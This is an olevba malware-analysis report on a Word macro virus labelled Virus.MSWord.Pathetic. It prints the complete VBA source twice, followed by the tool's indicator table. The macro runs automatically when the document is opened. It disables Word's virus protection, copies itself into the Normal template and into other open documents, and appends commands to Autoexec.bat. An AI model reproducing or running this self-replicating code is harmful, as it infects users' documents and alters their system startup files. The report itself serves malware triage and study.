olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pathetic
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Module11111111111111111.cls 
in file: Virus.MSWord.Pathetic - OLE stream: 'Macros/VBA/Module11111111111111111'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoopen()
On Error Resume Next
Dim d  As Document
Dim t As Template

Dim i As Integer
Set d = ActiveDocument
Set t = NormalTemplate

Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False


If d.VBProject.VBComponents.Count <> 1 Then
 d.VBProject.VBComponents.Item(2).Export "C:\vb.txt"
End If


If t.VBProject.VBComponents.Item(1).CodeModule.CountOfLines < 1 Then
    t.VBProject.VBComponents.Item(1).CodeModule.AddFromFile "C:\Vb.txt"
End If
If d.VBProject.VBComponents.Item(1).CodeModule.CountOfLines < 1 Then
    d.VBProject.VBComponents.Item(1).CodeModule.AddFromFile "C:\Vb.txt"
End If

For i = 1 To Word.Windows.Count
   If Word.Windows.Item(i).Document.VBProject.VBComponents.Count = 1 Then
        Word.Windows.Item(i).Document.VBProject.VBComponents.Import "c:\vb.txt"
        Word.Windows.Item(i).Document.Save
   End If
Next i

Open "C:\Autoexec.bat" For Append As #1
Print #1, "@echo The beak of the salmon " & Application.UserName
Print #1, "@copy c:\windows\*.ini super.ini /Y"
Close #1

If Month(Now) = 5 Then
    d.Close         'Pathetic I Know !
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO Module111111111111111111.bas 
in file: Virus.MSWord.Pathetic - OLE stream: 'Macros/VBA/Module111111111111111111'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoopen()
On Error Resume Next
Dim d  As Document
Dim t As Template

Dim i As Integer
Set d = ActiveDocument
Set t = NormalTemplate

Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False


If d.VBProject.VBComponents.Count <> 1 Then
 d.VBProject.VBComponents.Item(2).Export "C:\vb.txt"
End If


If t.VBProject.VBComponents.Item(1).CodeModule.CountOfLines < 1 Then
    t.VBProject.VBComponents.Item(1).CodeModule.AddFromFile "C:\Vb.txt"
End If
If d.VBProject.VBComponents.Item(1).CodeModule.CountOfLines < 1 Then
    d.VBProject.VBComponents.Item(1).CodeModule.AddFromFile "C:\Vb.txt"
End If

For i = 1 To Word.Windows.Count
   If Word.Windows.Item(i).Document.VBProject.VBComponents.Count = 1 Then
        Word.Windows.Item(i).Document.VBProject.VBComponents.Import "c:\vb.txt"
        Word.Windows.Item(i).Document.Save
   End If
Next i

Open "C:\Autoexec.bat" For Append As #1
Print #1, "@echo The beak of the salmon " & Application.UserName
Print #1, "@copy c:\windows\*.ini super.ini /Y"
Close #1

If Month(Now) = 5 Then
    d.Close         'Pathetic I Know !
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

